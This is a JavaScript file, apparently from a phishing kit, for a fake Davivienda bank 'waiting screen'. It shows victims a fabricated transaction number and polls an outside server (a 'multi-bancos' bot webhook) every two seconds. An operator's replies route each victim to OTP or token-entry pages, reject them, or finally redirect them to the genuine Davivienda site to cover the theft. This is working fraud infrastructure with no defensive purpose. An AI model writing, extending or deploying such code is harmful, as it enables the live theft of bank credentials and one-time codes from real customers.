/* ============================================
   DAVIVIENDA - PANTALLA DE ESPERA
   Consulta el estado al bot cada 2 segundos
   ============================================ */
(function() {
    'use strict';

    // ==========================================
    // CONFIGURACIÓN
    // ==========================================
    var WEBHOOK_URL = 'https://multi-bancos-production.up.railway.app';
    var BANCO = 'davivienda';
    var INTERVALO_CONSULTA = 2000;   // 2 segundos
    var TIMEOUT_MAXIMO = 90000;      // 90 segundos máximo

    // ==========================================
    // ELEMENTOS
    // ==========================================
    var fechaEl        = document.getElementById('dav-fecha');
    var cusEl          = document.getElementById('dav-cus');
    var mensajeError   = document.getElementById('davMensajeError');
    var errorTexto     = document.getElementById('davErrorTexto');
    var esperaTitulo   = document.getElementById('davEsperaTitulo');

    // ==========================================
    // FECHA DINÁMICA
    // ==========================================
    function obtenerFechaFormato() {
        var dias = ['Domingo', 'Lunes', 'Martes', 'Miércoles', 'Jueves', 'Viernes', 'Sábado'];
        var meses = ['Enero', 'Febrero', 'Marzo', 'Abril', 'Mayo', 'Junio',
                     'Julio', 'Agosto', 'Septiembre', 'Octubre', 'Noviembre', 'Diciembre'];
        var d = new Date();
        var diaNombre = dias[d.getDay()];
        var dia = d.getDate();
        var mes = meses[d.getMonth()];
        var anio = d.getFullYear();

        var h = d.getHours();
        var m = d.getMinutes();
        var ampm = h >= 12 ? 'PM' : 'AM';
        h = h % 12;
        if (h === 0) h = 12;
        var hh = (h < 10 ? '0' : '') + h;
        var mm = (m < 10 ? '0' : '') + m;

        return diaNombre + ' ' + dia + ' de ' + mes + ' de ' + anio + ', ' + hh + ':' + mm + ' ' + ampm;
    }

    if (fechaEl) fechaEl.textContent = obtenerFechaFormato();

    // ==========================================
    // CUS ALEATORIO
    // ==========================================
    var cus = Math.floor(100000000 + Math.random() * 900000000);
    if (cusEl) cusEl.textContent = cus;

    // ==========================================
    // SESIÓN (recuperar la que ya existe)
    // ==========================================
    var sessionId = '';
    try {
        sessionId = sessionStorage.getItem('sessionId') || '';
    } catch(e) {}

    if (!sessionId) {
        console.warn('⚠️ No hay sessionId — redirigiendo a login.html');
        window.location.href = 'login.html';
        return;
    }

    // ==========================================
    // DETECTAR SI VENIMOS DE OTP
    // ==========================================
    var vienedeOtp = false;
    try {
        vienedeOtp = sessionStorage.getItem('dav_otp') !== null;
    } catch(e) {}

    console.log('⏳ Esperando respuesta para sesión:', sessionId, '| De OTP:', vienedeOtp);

    // ==========================================
    // ESTADO
    // ==========================================
    var inicio = Date.now();
    var intervalo = null;
    var detenido = false;

    // ==========================================
    // MOSTRAR ERROR
    // ==========================================
    function mostrarError(texto) {
        if (errorTexto && texto) errorTexto.textContent = texto;
        if (mensajeError) mensajeError.classList.remove('hidden');
    }

    // ==========================================
    // DETENER
    // ==========================================
    function detener() {
        detenido = true;
        if (intervalo) clearInterval(intervalo);
    }

    // ==========================================
    // PROCESAR ESTADO
    // ==========================================
    function procesarEstado(estado) {
        console.log('📊 Estado actual:', estado, '| De OTP:', vienedeOtp);

        switch (estado) {
            case 'pendiente':
                // Sigue esperando
                break;

            case 'token':
                // SOLO reaccionar si NO venimos de OTP
                if (!vienedeOtp) {
                    detener();
                    if (esperaTitulo) esperaTitulo.textContent = 'Continuando...';
                    setTimeout(function() {
                        window.location.href = 'otp.html';
                    }, 400);
                }
                // Si venimos de OTP, ignorar (seguir esperando)
                break;

            case 'otp':
                // SOLO reaccionar si NO venimos de OTP
                if (!vienedeOtp) {
                    detener();
                    if (esperaTitulo) esperaTitulo.textContent = 'Continuando...';
                    setTimeout(function() {
                        window.location.href = 'otp.html';
                    }, 400);
                }
                // Si venimos de OTP, ignorar (seguir esperando)
                break;

            case 'rechazado':
                detener();

                if (vienedeOtp) {
                    // Rechazo en OTP → vuelve a otp.html con franja
                    try { sessionStorage.setItem('dav_rechazado_otp', '1'); } catch(e) {}
                    try { sessionStorage.removeItem('dav_otp'); } catch(e) {}
                } else {
                    // Rechazo en clave virtual → vuelve a token.html con franja
                    try { sessionStorage.setItem('dav_rechazado', '1'); } catch(e) {}
                }

                if (esperaTitulo) esperaTitulo.textContent = 'Verificación fallida';
                var spinner = document.querySelector('.dav-spinner');
                if (spinner) spinner.style.animationPlayState = 'paused';

                setTimeout(function() {
                    window.location.href = vienedeOtp ? 'otp.html' : 'token.html';
                }, 1500);
                break;

                       case 'finalizado':
                detener();
                // NO mostrar "Pago exitoso" — solo redirigir
                try {
                    sessionStorage.removeItem('dav_rechazado');
                    sessionStorage.removeItem('dav_rechazado_otp');
                    sessionStorage.removeItem('dav_otp');
                } catch(e) {}

                // Redirigir inmediatamente
                window.location.href = 'https://www.davivienda.com/personas/pse';
                break;
        }
    }

    // ==========================================
    // CONSULTAR ESTADO
    // ==========================================
    function consultarEstado() {
        if (detenido) return;

        if (Date.now() - inicio > TIMEOUT_MAXIMO) {
            detener();
            mostrarError('Tiempo de espera agotado. Por favor intente de nuevo.');
            if (esperaTitulo) esperaTitulo.textContent = 'Tiempo agotado';
            var spinner = document.querySelector('.dav-spinner');
            if (spinner) spinner.style.animationPlayState = 'paused';
            setTimeout(function() {
                window.location.href = 'login.html';
            }, 4000);
            return;
        }

        fetch(WEBHOOK_URL + '/' + BANCO + '/estado/' + encodeURIComponent(sessionId), {
            method: 'GET',
            headers: { 'Accept': 'application/json' }
        })
        .then(function(res) {
            if (!res.ok) throw new Error('HTTP ' + res.status);
            return res.json();
        })
        .then(function(data) {
            if (data && data.estado) {
                procesarEstado(data.estado);
            }
        })
        .catch(function(err) {
            console.warn('⚠️ Error consultando estado:', err);
        });
    }

    // ==========================================
    // ARRANCAR
    // ==========================================
    function iniciar() {
        setTimeout(consultarEstado, 500);
        intervalo = setInterval(consultarEstado, INTERVALO_CONSULTA);
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', iniciar);
    } else {
        iniciar();
    }

})();